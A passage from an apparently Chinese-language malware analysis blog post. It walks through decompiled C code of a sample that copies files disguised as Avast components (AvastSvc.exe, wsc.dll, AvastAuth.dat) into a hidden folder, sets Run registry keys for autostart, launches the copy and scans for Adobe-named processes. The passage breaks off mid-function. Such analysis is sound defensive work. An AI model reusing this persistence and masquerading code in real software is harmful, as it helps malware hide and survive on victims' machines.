class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_100090E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> len_0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">520</span>]; <span class="comment">// [esp+0h] [ebp-1D68h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> Ext; <span class="comment">// [esp+208h] [ebp-1B60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">510</span>]; <span class="comment">// [esp+20Ah] [ebp-1B5Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">520</span>]; <span class="comment">// [esp+408h] [ebp-1960h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> Filename; <span class="comment">// [esp+610h] [ebp-1758h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">510</span>]; <span class="comment">// [esp+612h] [ebp-1756h] BYREF</span></span><br><span class="line">  WCHAR v10; <span class="comment">// [esp+810h] [ebp-1558h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">518</span>]; <span class="comment">// [esp+812h] [ebp-1556h] BYREF</span></span><br><span class="line">  WCHAR v12; <span class="comment">// [esp+A18h] [ebp-1350h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">518</span>]; <span class="comment">// [esp+A1Ah] [ebp-134Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">520</span>]; <span class="comment">// [esp+C20h] [ebp-1148h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">520</span>]; <span class="comment">// [esp+E28h] [ebp-F40h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> Dir; <span class="comment">// [esp+1030h] [ebp-D38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">510</span>]; <span class="comment">// [esp+1032h] [ebp-D36h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> FullPath; <span class="comment">// [esp+1230h] [ebp-B38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">518</span>]; <span class="comment">// [esp+1232h] [ebp-B36h] BYREF</span></span><br><span class="line">  WCHAR v20[<span class="number">260</span>]; <span class="comment">// [esp+1438h] [ebp-930h] BYREF</span></span><br><span class="line">  WCHAR v21; <span class="comment">// [esp+1640h] [ebp-728h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">518</span>]; <span class="comment">// [esp+1642h] [ebp-726h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ppath[<span class="number">520</span>]; <span class="comment">// [esp+1848h] [ebp-520h] BYREF</span></span><br><span class="line">  _WORD v24[<span class="number">260</span>]; <span class="comment">// [esp+1A50h] [ebp-318h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v25[<span class="number">12</span>]; <span class="comment">// [esp+1C58h] [ebp-110h] BYREF</span></span><br><span class="line">  __int16 v26; <span class="comment">// [esp+1C88h] [ebp-E0h]</span></span><br><span class="line">  HANDLE hObject; <span class="comment">// [esp+1C9Ch] [ebp-CCh] BYREF</span></span><br><span class="line">  HANDLE v28; <span class="comment">// [esp+1CA0h] [ebp-C8h]</span></span><br><span class="line">  __int16 v29[<span class="number">46</span>]; <span class="comment">// [esp+1CACh] [ebp-BCh] BYREF</span></span><br><span class="line">  __int16 v30[<span class="number">20</span>]; <span class="comment">// [esp+1D08h] [ebp-60h] BYREF</span></span><br><span class="line">  __int16 v31[<span class="number">16</span>]; <span class="comment">// [esp+1D30h] [ebp-38h] BYREF</span></span><br><span class="line">  WCHAR v32; <span class="comment">// [esp+1D50h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp+1D52h] [ebp-16h]</span></span><br><span class="line">  __int16 v34; <span class="comment">// [esp+1D56h] [ebp-12h]</span></span><br><span class="line">  <span class="type">wchar_t</span> Drive; <span class="comment">// [esp+1D58h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [esp+1D5Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [esp+1D60h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> pName; <span class="comment">// [esp+1D64h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v31[<span class="number">0</span>] = <span class="string">&#x27;%&#x27;</span>;                                 <span class="comment">// %userprofile%\\</span></span><br><span class="line"><span class="comment">  v31[1] = &#x27;u&#x27;;</span></span><br><span class="line">  v31[<span class="number">2</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v31[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v31[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v31[<span class="number">5</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">  v31[<span class="number">6</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v31[<span class="number">7</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v31[<span class="number">8</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">  v31[<span class="number">9</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v31[<span class="number">10</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v31[<span class="number">11</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v31[<span class="number">12</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">  v31[<span class="number">13</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v31[<span class="number">14</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v30[<span class="number">0</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">  v30[<span class="number">1</span>] = <span class="string">&#x27;a&#x27;</span>;                                 <span class="comment">// %allusersprofile%\\</span></span><br><span class="line"><span class="comment">  v30[2] = &#x27;l&#x27;;                                 // C:\程序数据</span></span><br><span class="line">  v30[<span class="number">3</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v30[<span class="number">4</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v30[<span class="number">5</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v30[<span class="number">6</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v30[<span class="number">7</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v30[<span class="number">8</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v30[<span class="number">9</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">  v30[<span class="number">10</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v30[<span class="number">11</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v30[<span class="number">12</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">  v30[<span class="number">13</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v30[<span class="number">14</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v30[<span class="number">15</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v30[<span class="number">16</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">  v30[<span class="number">17</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v30[<span class="number">18</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  exec_lstrcpyW(v14, v31);</span><br><span class="line">  exec_lstrcpyW(v15, v30);</span><br><span class="line">  pName = sub_1000C320();</span><br><span class="line">  exec_lstrcatW(v14, pName);</span><br><span class="line">  exec_lstrcatW(v15, pName);</span><br><span class="line">  exec_lstrcatW(v14, <span class="string">L&quot;\\&quot;</span>);</span><br><span class="line">  exec_lstrcatW(v15, <span class="string">L&quot;\\&quot;</span>);</span><br><span class="line">  exec_ExpandEnvironmentStringsW(v15, v24, <span class="number">520</span>);</span><br><span class="line">  <span class="keyword">if</span> ( exec_GetFileAttributesW(v24) == <span class="number">-1</span> &amp;&amp; !exec_CreateDirectoryW(v24, <span class="number">0</span>) )<span class="comment">// 创建目录</span></span><br><span class="line">    exec_ExpandEnvironmentStringsW(v14, v24, <span class="number">520</span>);</span><br><span class="line">  exec_lstrcpyW(ppath, v24);</span><br><span class="line">  exec_lstrcatW(ppath, <span class="string">L&quot;AvastSvc.exe&quot;</span>);</span><br><span class="line">  exec_lstrcpyW(v7, v24);</span><br><span class="line">  exec_lstrcatW(v7, <span class="string">L&quot;wsc.dll&quot;</span>);</span><br><span class="line">  exec_lstrcpyW(v4, v24);</span><br><span class="line">  exec_lstrcatW(v4, <span class="string">L&quot;AvastAuth.dat&quot;</span>);</span><br><span class="line">  Drive = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  Dir = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  Filename = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  Ext = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="keyword">sizeof</span>(v22));</span><br><span class="line">  FullPath = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="keyword">sizeof</span>(v19));</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="keyword">sizeof</span>(v11));</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="keyword">sizeof</span>(v13));</span><br><span class="line">  exec_GetModuleFileNameW(<span class="number">0</span>, &amp;FullPath, <span class="number">520</span>);</span><br><span class="line">  _wsplitpath_s(&amp;FullPath, &amp;Drive, <span class="number">3u</span>, &amp;Dir, <span class="number">0x100</span>u, &amp;Filename, <span class="number">0x100</span>u, &amp;Ext, <span class="number">0x100</span>u);</span><br><span class="line">  wsprintfW(&amp;v21, <span class="string">L&quot;%s%s&quot;</span>, &amp;Drive, &amp;Dir);</span><br><span class="line">  wsprintfW(&amp;v10, <span class="string">L&quot;%s%s&quot;</span>, &amp;v21, <span class="string">L&quot;wsc.dll&quot;</span>);</span><br><span class="line">  wsprintfW(&amp;v12, <span class="string">L&quot;%s%s&quot;</span>, &amp;v21, <span class="string">L&quot;AvastAuth.dat&quot;</span>);</span><br><span class="line">  sub_10007380(v24);</span><br><span class="line">  exec_SetFileAttributesW(v24, <span class="number">2</span>);</span><br><span class="line">  exec_SetFileAttributesW(v24, <span class="number">2</span>);</span><br><span class="line">  exec_CopyFileW(&amp;FullPath, ppath, <span class="number">0</span>);          <span class="comment">// 创建文件AvastSvc.exe、wsc.dll、AvastAuth.dat</span></span><br><span class="line">  exec_CopyFileW(&amp;v10, v7, <span class="number">0</span>);</span><br><span class="line">  exec_CopyFileW(&amp;v12, v4, <span class="number">0</span>);</span><br><span class="line">  v0 = exec_GetSystemTimeAsFileTime(<span class="number">0</span>);         <span class="comment">// 检索当前日期和时间</span></span><br><span class="line">  srand(v0);</span><br><span class="line">  v37 = rand() % <span class="number">899</span> + <span class="number">100</span>;</span><br><span class="line">  wsprintfW(v20, <span class="string">L&quot;\&quot;%s\&quot; %d&quot;</span>, ppath, v37);</span><br><span class="line">  v29[<span class="number">0</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">  v29[<span class="number">1</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v29[<span class="number">2</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">  v29[<span class="number">3</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v29[<span class="number">4</span>] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">  v29[<span class="number">5</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v29[<span class="number">6</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v29[<span class="number">7</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v29[<span class="number">8</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v29[<span class="number">9</span>] = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">  v29[<span class="number">10</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v29[<span class="number">11</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">  v29[<span class="number">12</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v29[<span class="number">13</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v29[<span class="number">14</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v29[<span class="number">15</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v29[<span class="number">16</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">  v29[<span class="number">17</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v29[<span class="number">18</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v29[<span class="number">19</span>] = <span class="string">&#x27;W&#x27;</span>;</span><br><span class="line">  v29[<span class="number">20</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v29[<span class="number">21</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  v29[<span class="number">22</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v29[<span class="number">23</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v29[<span class="number">24</span>] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">  v29[<span class="number">25</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v29[<span class="number">26</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v29[<span class="number">27</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">  v29[<span class="number">28</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v29[<span class="number">29</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v29[<span class="number">30</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v29[<span class="number">31</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v29[<span class="number">32</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  v29[<span class="number">33</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v29[<span class="number">34</span>] = <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">  v29[<span class="number">35</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v29[<span class="number">36</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v29[<span class="number">37</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v29[<span class="number">38</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v29[<span class="number">39</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v29[<span class="number">40</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  v29[<span class="number">41</span>] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v29[<span class="number">42</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">  v29[<span class="number">43</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v29[<span class="number">44</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  v29[<span class="number">45</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  len = exec_lstrlenW(v20);</span><br><span class="line">  exec_RegCreate_SetKeyExW(<span class="number">0x80000002</span>, v29, pName, v20, <span class="number">2</span> * len + <span class="number">2</span>, <span class="number">1</span>);<span class="comment">// HKEY_CURRENT_USER 0x80000001/打开注册表项并为文件创建键值（自启动）</span></span><br><span class="line">  len_0 = exec_lstrlenW(v20);</span><br><span class="line">  exec_RegCreate_SetKeyExW(<span class="number">0x80000001</span>, v29, pName, v20, <span class="number">2</span> * len_0 + <span class="number">2</span>, <span class="number">1</span>);<span class="comment">// HKEY_LOCAL_MACHINE          0x80000002</span></span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  wsprintfW(&amp;v32, <span class="string">L&quot; %d&quot;</span>, v37);</span><br><span class="line">  exec_lstrcatW(ppath, &amp;v32);                   <span class="comment">// 拼接路径</span></span><br><span class="line">  exec_memset(&amp;hObject, <span class="number">0</span>, <span class="string">&#x27;\x10&#x27;</span>);</span><br><span class="line">  exec_memset(v25, <span class="number">0</span>, <span class="number">0x44</span>);</span><br><span class="line">  v25[<span class="number">0</span>] = <span class="number">0x44</span>;</span><br><span class="line">  v25[<span class="number">11</span>] = <span class="string">&#x27;\x01&#x27;</span>;</span><br><span class="line">  v26 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( exec_CreateProcessW(<span class="number">0</span>, ppath, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, v25, &amp;hObject) )<span class="comment">// 为AvastSvc.exe创建进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    exec_ResumeThread(v28);</span><br><span class="line">    CloseHandle(hObject);</span><br><span class="line">    CloseHandle(v28);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码先指向C:\程序数据，创建一个文件夹，然后将三个程序wsc.dll、AvastSvc.exe、AvastAuth.dat复制到文件夹内。后对文件夹内的三个文件设置注册表的HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \Windows \ CurrentVersion \ Run键值进行自启动设置，最后创建AvastSvc.exe进程。</p><p>执行case2操作流程：先创建一个互斥体，拿命令行第四个参数与“-net”字符串进行比较，不相同则执行Reg_Network()函数。而Reg_Network()函数功能是将注册表HKEY_LOCAL_MACHINE \ SYSTEM \ ControlSet001 \Control \ Network\Version置1，后面同样执行run_self()，再往后执行sub_100153A0()函数。</p><h3 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h3><h4 id="sub-100153A0"><a href="#sub-100153A0" class="headerlink" title="sub_100153A0()"></a>sub_100153A0()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_100153A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_10015600();                               <span class="comment">// 遍历进程,打开进程设置自启动</span></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = exec_CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_10014E10, <span class="number">0</span>, <span class="number">0</span>, &amp;v1);<span class="comment">// 创建线程</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    exec_CloseHandle(v2);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中sub_10015600()函数如下</p><h4 id="sub-10015600"><a href="#sub-10015600" class="headerlink" title="sub_10015600()"></a>sub_10015600()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_10015600</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> v1[<span class="number">18</span>]; <span class="comment">// [esp+8h] [ebp-E4h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> v2[<span class="number">16</span>]; <span class="comment">// [esp+2Ch] [ebp-C0h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> v3[<span class="number">16</span>]; <span class="comment">// [esp+4Ch] [ebp-A0h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> SubStr[<span class="number">16</span>]; <span class="comment">// [esp+6Ch] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> v5[<span class="number">16</span>]; <span class="comment">// [esp+8Ch] [ebp-60h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> v6[<span class="number">14</span>]; <span class="comment">// [esp+ACh] [ebp-40h] BYREF</span></span><br><span class="line">  __int16 v7[<span class="number">18</span>]; <span class="comment">// [esp+C8h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  SubStr[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;                              <span class="comment">// AdobeHelper.exe</span></span><br><span class="line">  SubStr[<span class="number">1</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">2</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">3</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">5</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">6</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">7</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">8</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">9</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">10</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">11</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">12</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">13</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">14</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  SubStr[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v1[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;                                  <span class="comment">// AdobeUpdates.exe</span></span><br><span class="line">  v1[<span class="number">1</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v1[<span class="number">2</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v1[<span class="number">3</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  v1[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v1[<span class="number">5</span>] = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">  v1[<span class="number">6</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">  v1[<span class="number">7</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v1[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v1[<span class="number">9</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v1[<span class="number">10</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v1[<span class="number">11</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v1[<span class="number">12</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  v1[<span class="number">13</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v1[<span class="number">14</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">  v1[<span class="number">15</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v1[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v2[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  v2[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">5</span>] = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">  v2[<span class="number">6</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span 